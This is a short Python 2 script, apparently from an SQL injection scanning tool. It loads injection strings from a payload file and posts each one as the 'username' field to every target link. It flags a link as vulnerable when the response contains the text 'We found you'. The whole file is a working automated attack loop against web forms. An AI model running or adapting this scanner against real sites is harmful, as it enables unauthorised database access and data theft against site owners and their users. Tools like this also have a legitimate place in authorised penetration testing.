import requests
from utility import *

banner(SI)

commons = 'sql_injection_commons.txt'
f = open(commons, 'r')
injections = f.read().splitlines()

for link in read_links():
    for injection in injections:
        payload = {
            'username': injection
        }
        req = requests.post(link, data=payload)
        if req.content.find('We found you') != -1:
            success_message(link + '\t' + json.dumps(payload))

print '\n'
